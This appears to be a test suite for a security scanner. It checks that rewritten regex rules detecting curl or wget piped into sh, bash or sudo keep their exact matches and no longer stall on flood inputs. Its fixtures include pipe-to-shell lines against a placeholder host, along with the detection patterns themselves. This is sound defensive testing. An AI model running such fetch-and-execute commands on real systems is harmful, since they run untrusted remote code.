/**
 * The `HEAD.*TAIL` and `HEAD[^c]*TAIL` patterns in src/hardening/scanner.ts
 * stop being quadratic on a line that repeats HEAD without TAIL, and still
 * return exactly what the patterns returned, captures included.
 *
 *   SKILL-007     curl or wget piped to sh or bash
 *   DEP-004       curl or wget piped to sh or bash in an npm script
 *   NEMO-001      curl piped to sh, bash or sudo
 *   INSTALL-001   curl or wget, then the first pipe, into sh or bash
 *   MEM-006       brackets cut from the receiver of a push
 *
 * The gap (`.*` to the end of the line, `[^c]*` to the next `c`) runs past
 * every later HEAD and backs off to look for TAIL, from every HEAD, so one
 * line of `curl ` costs the square of its length: 256 KiB took about 5 s in
 * each pattern, and 1 MiB extrapolates to about 85 s. The scanned skill,
 * script or manifest comes from whoever wrote it, so a scan that stalls on it
 * is a way to avoid being scanned.
 *
 * Each site now holds a HeadTailRegExp (src/types/lazy-scan.ts) built from its
 * unchanged literal. The source suite requires every literal in the file that
 * the class accepts, other than the word chains already wrapped, to be
 * wrapped, and the wrapped ones to be exactly the oracles below. The
 * differential suite requires each wrapped pattern to return what its oracle
 * returns, captures and lastIndex included, over 100,000 generated inputs per
 * site plus hand cases. The timing suite covers each flood shape at 64 KiB
 * and 1 MiB, and the detection suite runs the real checks on 1 MiB files.
 */
import { describe, it, expect } from 'vitest';
import * as fsp from 'fs/promises';
import * as fsSync from 'fs';
import * as path from 'path';
import ts from 'typescript';
import { HardeningScanner } from '../src/hardening/scanner';
import { HeadTailRegExp } from '../src/types/lazy-scan';
import { tempDir } from './helpers/temp-dir';
import { timeScaling, scalesLinearly, describeScaling, RULE } from './helpers/scaling-time';

const KiB = 1024;
const MiB = 1024 * KiB;

interface Site {
  oracle: RegExp;
  /** Pieces the input generator draws from, besides the shared noise. */
  words: string[];
  /** Flood units: each repeats HEAD, or pieces of TAIL, without a match. */
  floods: string[];
}

const PIPE_WORDS = ['curl', 'wget', '|', '| ', '|  ', 'sh', 'bash', 'ba', 'sudo', 'curl x ', 'wget -q ', '| sh', '|bash', '| sudo',
  'curl | sh', 'wget |bash', 'curl -s |  sudo', 'wget x | sh'];

// The patterns as they were before the change. Do not edit these to make a
// test pass: they define what each site must keep matching.
const SITES: Record<string, Site> = {
  'SKILL-007 curl': {
    oracle: /curl.*\|\s*(ba)?sh/gi,
    words: PIPE_WORDS,
    floods: ['curl ', 'curl | ', 'curl |', '| curl ', 'curl\n', 'curl | ba '],
  },
  'SKILL-007 wget': {
    oracle: /wget.*\|\s*(ba)?sh/gi,
    words: PIPE_WORDS,
    floods: ['wget ', 'wget | ', 'wget\n', '| wget '],
  },
  'DEP-004 curl sh': {
    oracle: /curl\b.*\|\s*sh/i,
    words: PIPE_WORDS,
    floods: ['curl ', 'curl | ', 'curlx ', 'curl\n'],
  },
  'DEP-004 curl bash': {
    oracle: /curl\b.*\|\s*bash/i,
    words: PIPE_WORDS,
    floods: ['curl ', 'curl | ', 'curl | sh '],
  },
  'DEP-004 wget sh': {
    oracle: /wget\b.*\|\s*sh/i,
    words: PIPE_WORDS,
    floods: ['wget ', 'wget | ', 'wget | bash '],
  },
  'DEP-004 wget bash': {
    oracle: /wget\b.*\|\s*bash/i,
    words: PIPE_WORDS,
    floods: ['wget ', 'wget | ', 'wget | sh '],
  },
  'NEMO-001 sh': {
    oracle: /curl.*\|\s*(ba)?sh/i,
    words: PIPE_WORDS,
    floods: ['curl ', 'curl | ', 'curl | sudo '],
  },
  'NEMO-001 sudo': {
    oracle: /curl.*\|\s*sudo/i,
    words: PIPE_WORDS,
    floods: ['curl ', 'curl | ', 'curl | sh '],
  },
  'INSTALL-001': {
    oracle: /\b(curl|wget)\b[^|]*\|\s*(ba)?sh\b/g,
    words: ['curl', 'wget', '|', '| ', 'sh', 'bash', 'ba', 'shx', 'curlwget', 'curl | sh', 'wget |bash', 'wget -qO- x | sh',
      'curl x |  bash ', '| sudo'],
    floods: ['wget curl ', 'curl |', 'curl\n', 'curl | shx ', 'curlwget '],
  },
  'MEM-006 bracket strip': {
    oracle: /\[[^\]]*\]/g,
    words: ['[', '[', ']', '[x]', '[[', ']]', '[0]', 'a.b', "['k']"],
    floods: ['[', '[x', '[\n', ']', '[[]'],
  },
};
const NAMES = Object.keys(SITES);

// Accepted shapes the scanner does not use today, so that each rule of the
// class is held to the built-in regex too: a class in the head, overlapping
// heads, a capture in the head, \B, a run in the tail, a tail that crosses
// line breaks, lookarounds in the tail, and the sticky flag.
const SYNTHETIC: Record<string, Site> = {
  'class head, tail across line breaks': {
    oracle: /[ab]c.*;\s*(x)?y/g,
    words: ['ac', 'bc', 'cc', ';', '; ', 'x', 'y', 'xy', 'ac;y'],
    floods: ['ac ', 'bc;'],
  },
  'overlapping heads': {
    oracle: /(?:aa|ab)a.*\|b/gi,
    words: ['aa', 'ab', 'a', 'aaa', 'aba', '|', '|b', 'b'],
    floods: ['a', 'aba '],
  },
  'capture in the head, run in the tail': {
    oracle: /(ab)\b[^;]*;[^;]*;(c)/g,
    words: ['ab', 'abc', ';', ';;', 'c', ';c', 'b', 'ab;x;c', 'ab ;;c'],
    floods: ['ab ', 'ab;'],
  },
  '\\B and lookarounds in the tail': {
    oracle: /a\Bb.*,(?<=,)\s+(?=c)c?/gy,
    words: ['ab', 'a b', ',', ', ', ',c', ', c', 'c', 'ab, c', 'ab,\tc'],
    floods: ['ab ', 'ab, '],
  },
};

const withFlags = (re: RegExp, extra: string): string =>
  re.flags.includes(extra) ? re.flags : re.flags + extra;

const readSrc = (rel: string): string => fsSync.readFileSync(path.join(__dirname, '..', rel), 'utf-8');

// ---------------------------------------------------------------------------
// Source: every site is wrapped, and the oracles cover every site
// ---------------------------------------------------------------------------

const WRAPPED_ELSEWHERE = ['WordChainRegExp', 'WordChainAlternationRegExp'];

describe('the HEAD.*TAIL and HEAD[^c]*TAIL literals in src/hardening/scanner.ts', () => {
  it('are each the argument of new HeadTailRegExp, and are exactly the oracles', () => {
    const rel = 'src/hardening/scanner.ts';
    const file = ts.createSourceFile(rel, readSrc(rel), ts.ScriptTarget.Latest, true);
    const found: string[] = [];
    const unwrapped: string[] = [];
    const visit = (node: ts.Node): void => {
      if (node.kind === ts.SyntaxKind.RegularExpressionLiteral) {
        const text = node.getText();
        const slash = text.lastIndexOf('/');
        let accepted = true;
        try {
          new HeadTailRegExp(text.slice(1, slash), text.slice(slash + 1));
        } catch {
          accepted = false;
        }
        const parent = node.parent;
        const wrappedBy = ts.isNewExpression(parent) && parent.arguments?.length === 1 && parent.arguments[0] === node
          ? parent.expression.getText()
          : '';
        if (accepted && !WRAPPED_ELSEWHERE.includes(wrappedBy)) {
          found.push(text);
          if (wrappedBy !== 'HeadTailRegExp') {
            unwrapped.push(`${text} at line ${file.getLineAndCharacterOfPosition(node.getStart()).line + 1}`);
          }
        }
      }
      ts.forEachChild(node, visit);
    };
    visit(file);
    expect(unwrapped).toEqual([]);
    expect(found.sort()).toEqual(NAMES.map((n) => String(SITES[n].oracle)).sort());
  });
});

// ---------------------------------------------------------------------------
// Differential: HeadTailRegExp against each oracle
// ---------------------------------------------------------------------------

function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

// Every line terminator `.` stops at, CRLF, whitespace `\s` takes that is not
// a space (tab, vertical tab, no-break space, byte order mark), quotes and
// brackets, an astral character, a lone surrogate, and four letters whose
// case mapping crosses between ASCII and the rest (U+017F uppercases to S,
// U+212A lowercases to k, U+0130 and U+0131 are the dotted and dotless i),
// which the i flag without u does not fold together.
const NOISE = [' ', ' ', 'x', '\n', '\r', '\r\n', ' ', ' ', '\t', '\v', ' ', '﻿', ' ', ' ',
  '"', "'", '<', '>', '$', '{', '.', '-', '_', '\u{1F600}', '\uD800', 'ſ', 'K', 'İ', 'ı'];

function alphabetFor(words: string[]): string[] {
  return [...words, ...words, ...words, ...words.map((w) => w.toUpperCase()), ...words.flatMap((w) => [...w]), ...NOISE];
}

function generate(alphabet: string[], rnd: () => number): string {
  const n = Math.floor(rnd() * 24);
  let s = '';
  for (let i = 0; i < n; i++) s += alphabet[Math.floor(rnd() * alphabet.length)];
  return s;
}

/** A match with everything exec puts on it. */
const described = (m: RegExpExecArray | null): unknown =>
  m === null ? null : { index: m.index, all: [...m], input: m.input, groups: m.groups };

/**
 * What one pattern does with `text`: test under its own flags from lastIndex
 * `from`, every match of a global copy, and one sticky attempt at `at`, each
 * with the lastIndex it leaves behind.
 */
function transcript(own: RegExp, global: RegExp, sticky: RegExp, text: string, from: number, at: number): unknown[] {
  own.lastIndex = from;
  const out: unknown[] = [own.test(text), own.lastIndex];
  own.lastIndex = from;
  out.push(described(own.exec(text)), own.lastIndex);
  global.lastIndex = 0;
  for (let m = global.exec(text); m !== null; m = global.exec(text)) out.push(described(m), global.lastIndex);
  out.push(global.lastIndex);
  sticky.lastIndex = at;
  out.push(described(sticky.exec(text)), sticky.lastIndex);
  return out;
}

/** The String.prototype methods that call exec, on `text`. */
function viaStringMethods(re: RegExp, text: string): unknown[] {
  const g = new (re.constructor as RegExpConstructor)(re.source, withFlags(re, 'g'));
  const single = text.match(new (re.constructor as RegExpConstructor)(re.source, re.flags.replace('g', '')));
  return [
    single === null ? null : [single.index, [...single], single.input === text],
    text.match(g),
    [...text.matchAll(g)].map((m) => [m.index, [...m]]),
    text.replace(g, (...args) => `[${args.slice(0, -2).join('|')}@${args[args.length - 2]}]`),
    text.replace(re, '<$&$1>'),
    text.search(re),
    text.split(re),
  ];
}

// Nested openers, a tail on the next line, a tail behind a second pipe, case
// variants, word boundaries, and every kind of line break.
const HAND_CASES = [
  'curl x | sh', 'curl | curl | sh', 'curl | sh | sh', 'curl | sh curl | bash', 'curl |\nsh', 'curl\n| sh',
  'curl x |\r\nbash', 'curl x |  sh', 'curl  | sh', 'curl |  sudo', 'wget curl | sudo', 'curl|sh',
  'CURL | SH', 'Curl | BaSh', 'curlwget | sh', 'xcurl | sh', 'curlx | sh', 'wget-q | shx', 'curl | ba sh',
  'curl | bash curl | ba', 'curl a | b | sh\ncurl c | d', 'curl [x] | sh', 'curl | sh\r\nwget | bash\rwget |',
  'curl ſ | ſh', 'cuRL | sudo | sh', '| sh curl', 'wget | wget | bash | sh', 'curl\t|\tsh\t', 'curl |',
  '[a]', '[[a]]', '[a][b]', '[', ']', '[\n]', '[a]]', '[[[', 'a[b[c]d]e', 'x[ y ]z[', 'memory[0].messages[i]',
  'ac;y', 'bc ; x\ny', 'aaa|b', 'aaba|b|b', 'ab;;c', 'ab x;y;c ab;;c', 'ab, c', 'a b, c', 'ab,  ', 'ab, c ab, c',
  '',
];

function compareSite(site: Site, seed: number, inputs: number): void {
  const { oracle } = site;
  const wrapped = new HeadTailRegExp(oracle);
  expect(wrapped.source).toBe(oracle.source);
  expect(wrapped.flags).toBe(oracle.flags);
  const sides = [
    [new RegExp(oracle), new RegExp(oracle.source, withFlags(oracle, 'g')), new RegExp(oracle.source, withFlags(oracle, 'y'))],
    [wrapped, new HeadTailRegExp(oracle.source, withFlags(oracle, 'g')), new HeadTailRegExp(oracle.source, withFlags(oracle, 'y'))],
  ] as const;
  const compare = (text: string, from: number, at: number): void => {
    const want = transcript(sides[0][0], sides[0][1], sides[0][2], text, from, at);
    const got = transcript(sides[1][0], sides[1][1], sides[1][2], text, from, at);
    if (JSON.stringify(got) !== JSON.stringify(want)) {
      expect({ text, from, at, got }).toEqual({ text, from, at, got: want });
    }
  };
  const hand = [...HAND_CASES, ...site.words.map((w) => w.repeat(3)), site.words.join(''), site.words.join(' ')];
  for (const text of hand) {
    for (let at = 0; at <= text.length + 1; at++) compare(text, at, at);
  }
  const alphabet = alphabetFor(site.words);
  const rnd = mulberry32(seed);
  const counter = new RegExp(oracle.source, oracle.flags.replace(/[gy]/g, ''));
  let matched = 0;
  for (let i = 0; i < inputs; i++) {
    const text = generate(alphabet, rnd);
    const from = Math.floor(rnd() * (text.length + 2));
    const at = Math.floor(rnd() * (text.length + 2));
    compare(text, from, at);
    if (counter.test(text)) matched++;
  }
  // The generator has to produce matches for the comparison to mean anything.
  expect(matched).toBeGreaterThan(inputs / 10);
}

describe('HeadTailRegExp returns what each oracle returns', () => {
  for (const name of NAMES) {
    it(`${name}: ${SITES[name].oracle} on 100,000 generated inputs and the hand cases`, () => {
      compareSite(SITES[name], 0x5eed0400 + NAMES.indexOf(name), 100_000);
    });
  }

  const synthetic = Object.keys(SYNTHETIC);
  for (const name of synthetic) {
    it(`${name}: ${SYNTHETIC[name].oracle} on 50,000 generated inputs and the hand cases`, () => {
      compareSite(SYNTHETIC[name], 0x5eed0500 + synthetic.indexOf(name), 50_000);
    });
  }

  it('match, matchAll, replace, search and split agree with each oracle on the hand cases and 10,000 generated inputs per site', () => {
    const all = { ...SITES, ...SYNTHETIC };
    Object.keys(all).forEach((name, k) => {
      const { oracle, words } = all[name];
      const rnd = mulberry32(0x5eed0600 + k);
      const alphabet = alphabetFor(words);
      const texts = [...HAND_CASES];
      for (let i = 0; i < 10_000; i++) texts.push(generate(alphabet, rnd));
      for (const text of texts) {
        const got = viaStringMethods(new HeadTailRegExp(oracle), text);
        const want = viaStringMethods(new RegExp(oracle), text);
        if (JSON.stringify(got) !== JSON.stringify(want)) {
          expect({ name, text, got }).toEqual({ name, text, got: want });
        }
      }
    });
  });

  it('builds the same exec result as the built-in exec, own properties included', () => {
    const text = 'a\ncurl -s x | BASH then wget y |\n sh\nwget';
    for (const flags of ['', 'g', 'i', 'gi', 'y', 'gy', 'iy']) {
      for (const source of ['\\b(curl|wget)\\b[^|]*\\|\\s*(ba)?sh\\b', '(wget|curl).*\\|\\s*(ba)?sh']) {
        const want = new RegExp(source, flags);
        const got = new HeadTailRegExp(source, flags);
        for (const from of [0, 2, 3, 12, 25, 40, 100]) {
          want.lastIndex = from;
          got.lastIndex = from;
          const w = want.exec(text);
          const g = got.exec(text);
          expect(g).toEqual(w);
          if (w !== null && g !== null) {
            expect(Object.keys(g)).toEqual(Object.keys(w));
            expect([g.index, g.input, g.groups]).toEqual([w.index, w.input, w.groups]);
          }
          expect(got.lastIndex).toBe(want.lastIndex);
        }
      }
    }
  });

  it('reads lastIndex the way the built-in exec does', () => {
    for (const value of ['5', 5.9, -3, NaN, Infinity, 1e300, '']) {
      const want = /curl.*\|\s*(ba)?sh/g;
      const got = new HeadTailRegExp(/curl.*\|\s*(ba)?sh/g);
      (want as { lastIndex: unknown }).lastIndex = value;
      (got as { lastIndex: unknown }).lastIndex = value;
      const text = 'curl a | sh curl b | bash\ncurl c | sh';
      expect(got.exec(text)).toEqual(want.exec(text));
      expect(got.lastIndex).toBe(want.lastIndex);
    }
  });

  it('refuses a source or flags it cannot answer for', () => {
    for (const [source, flags] of [
      ['curl.*sh', ''], ['curl.*?\\|sh', ''], ['curl.+\\|sh', ''], ['curl\\s.*\\|sh', ''], ['cur?l.*\\|sh', ''],
      ['(cu|c)rl.*\\|sh', ''], ['curl.*\\|.*sh', ''], ['curl.*\\|(sh)*', ''], ['curl.*\\|[^x]*sh', ''],
      ['curl.*\\|\\S+', ''], ['(a)b.*\\|\\1', ''], ['curl[^|]*;sh', ''], ['curl[^|]*?\\|sh', ''], ['curl|x.*\\|sh', ''],
      ['^curl.*\\|sh', ''], ['curl.*\\|sh$', ''], ['.*\\|sh', ''], ['curl.*', ''], ['[\\s]url.*\\|sh', ''],
      ['(?<n>a)b.*\\|c', ''], ['ab.*\\|(?<n>x)', ''], ['a|b[^|]*\\|x', ''], ['a\\|[^|]*\\|x', ''], ['a[^a]*a', ''],
      ['curl.*\\|sh', 'm'], ['curl.*\\|sh', 's'], ['curl.*\\|sh', 'u'], ['curl.*\\|sh', 'd'],
    ]) {
      expect(() => new HeadTailRegExp(source, flags), `/${source}/${flags}`).toThrow(SyntaxError);
    }
  });
});

// ---------------------------------------------------------------------------
// Timing
// ---------------------------------------------------------------------------

const flood = (unit: string, bytes: number): string =>
  unit.repeat(Math.ceil(bytes / unit.length)).slice(0, bytes);

interface Shape {
  name: string;
  input: (bytes: number) => string;
}

function shapesFor(site: Site): Shape[] {
  const shapes: Shape[] = [];
  for (const unit of site.floods) {
    shapes.push({ name: `${JSON.stringify(unit)} repeated`, input: (n) => flood(unit, n) });
  }
  // A match at the end of the flood, and one long whitespace run after a pipe.
  const [first] = site.floods;
  const closer = site.oracle.source.startsWith('\\[') ? ']' : '| sh';
  shapes.push({ name: `${JSON.stringify(first)} repeated, then ${JSON.stringify(closer)}`, input: (n) => flood(first, n) + closer });
  shapes.push({ name: `${JSON.stringify(first + '|')}, then spaces`, input: (n) => first + '|' + flood(' ', n) });
  return shapes;
}

describe('each flood shape costs linear time', () => {
  for (const name of NAMES) {
    const { oracle } = SITES[name];
    for (const shape of shapesFor(SITES[name])) {
      it(`${name}, ${shape.name}: ${RULE}`, () => {
        // Fresh matchers for every run, so that no run starts from state an earlier one left.
        const prepare = () => {
          const own = new HeadTailRegExp(oracle);
          const global = new HeadTailRegExp(oracle.source, withFlags(oracle, 'g'));
          return (s: string): void => {
            own.test(s);
            while (global.exec(s) !== null);
          };
        };
        const time = timeScaling(prepare, shape.input);
        console.log(`${name}, ${shape.name}: ${describeScaling(time)}`);
        expect(scalesLinearly(time), `${name}, ${shape.name}: ${describeScaling(time)}`).toBe(true);
      });
    }
  }
});

// ---------------------------------------------------------------------------
// Detection through the real checks, 1 MiB files
// ---------------------------------------------------------------------------

/** Lines of `width` characters of `unit`, `bytes` in all. */
const floodLines = (unit: string, width: number, bytes: number): string =>
  (flood(unit, width) + '\n').repeat(Math.ceil(bytes / (width + 1)));

const lineOf = (body: string, needle: string): number => body.slice(0, body.indexOf(needle)).split('\n').length;

async function writeFile(root: string, rel: string, body: string): Promise<void> {
  await fsp.mkdir(path.dirname(path.join(root, rel)), { recursive: true });
  await fsp.writeFile(path.join(root, rel), body);
}

/** Runs one private check of a fresh scanner; the timing suite above times the patterns this file covers. */
async function check(method: string, ...args: unknown[]): Promise<any[]> {
  return (new HardeningScanner() as any)[method](...args);
}

// SKILL-007, INSTALL-001 and MEM-006 cut or skip lines over 10,000
// characters, so their floods use lines of that width; NEMO-001 and DEP-004
// read whole lines.
const CAPPED_WIDTH = 10_000;

describe('the checks still report their positives in 1 MiB files, after a flood of each head', () => {
  it('SKILL-007 cites the curl piped to bash', async () => {
    const root = tempDir('head-tail-skill-');
    const positive = '- Install: curl -fsSL https://example.invalid/setup.sh | bash';
    const body = '---\nname: demo\n---\n' + floodLines('curl ', CAPPED_WIDTH, 512 * KiB) +
      floodLines('wget | ', CAPPED_WIDTH, 512 * KiB) + positive + '\n';
    await writeFile(root, 'skills/demo/SKILL.md', body);
    const drafts = await check('checkOpenclawSkills', root, false);
    expect(drafts.filter((f: any) => f.checkId === 'SKILL-007').map((f: any) => f.line)).toEqual([lineOf(body, positive)]);
  });

  it('DEP-004 fails on the script that pipes wget to sh, and passes on the flood alone', async () => {
    const flooded = { scripts: { a: flood('curl ', 512 * KiB), b: flood('wget | ', 512 * KiB) } };
    const clean = tempDir('head-tail-dep-clean-');
    await writeFile(clean, 'package.json', JSON.stringify(flooded));
    const pass = (await check('checkDependencySecurity', clean, false)).filter((f: any) => f.checkId === 'DEP-004');
    expect(pass.map((f: any) => f.passed)).toEqual([true]);
    const root = tempDir('head-tail-dep-');
    const positive = { ...flooded, scripts: { ...flooded.scripts, c: 'wget -qO- https://example.invalid/i.sh | sh' } };
    await writeFile(root, 'package.json', JSON.stringify(positive));
    const fail = (await check('checkDependencySecurity', root, false)).filter((f: any) => f.checkId === 'DEP-004');
    expect(fail.map((f: any) => [f.passed, f.file])).toEqual([[false, 'package.json']]);
  });

  it('NEMO-001 cites the curl piped to sudo after a 1 MiB line of curl', async () => {
    const root = tempDir('head-tail-nemo-');
    const positive = 'curl -fsSL https://example.invalid/get | sudo bash -';
    const body = '#!/bin/sh\n' + flood('curl ', 512 * KiB) + '\n' + flood('curl | ', 512 * KiB) + '\n' + positive + '\n';
    await writeFile(root, 'scripts/install.sh', body);
    const drafts = await check('checkNemoClawPatterns', root, false);
    const nemo001 = drafts.filter((f: any) => f.checkId === 'NEMO-001' && !f.passed);
    expect(nemo001.map((f: any) => [f.file, f.line])).toEqual([['scripts/install.sh', lineOf(body, positive)]]);
  });

  it('INSTALL-001 cites the wget piped to sh', async () => {
    const root = tempDir('head-tail-install-');
    const positive = 'wget -qO- https://example.invalid/i.sh | sh';
    const body = '#!/bin/sh\n' + floodLines('wget curl ', CAPPED_WIDTH, 512 * KiB) +
      floodLines('curl |', CAPPED_WIDTH, 512 * KiB) + positive + '\n';
    await writeFile(root, 'install.sh', body);
    const drafts = await check('checkInstallScripts', root, false);
    expect(drafts.filter((f: any) => f.checkId === 'INSTALL-001').map((f: any) => f.line)).toEqual([lineOf(body, positive)]);
  });

  it('MEM-006 still reads the persistent receiver behind brackets, after receivers of unclosed brackets', async () => {
    const root = tempDir('head-tail-mem-');
    const positive = 'session.messages[turn].push({ text: input });';
    // Each flood line pushes onto a local array behind a run of `[` with no
    // `]`, which the bracket strip used to rescan from every `[`.
    const local = 'x' + '['.repeat(CAPPED_WIDTH - 40) + '.lines.push({ text: input });';
    const body = (local + '\n').repeat(Math.ceil(MiB / (local.length + 1))) + '\n'.repeat(6) + positive + '\n';
    await writeFile(root, 'src/store.ts', body);
    const drafts = await check('checkMemoryStoreSanitization', root, false);
    expect(drafts.filter((f: any) => f.checkId === 'MEM-006').map((f: any) => f.line)).toEqual([lineOf(body, positive)]);
  });
});
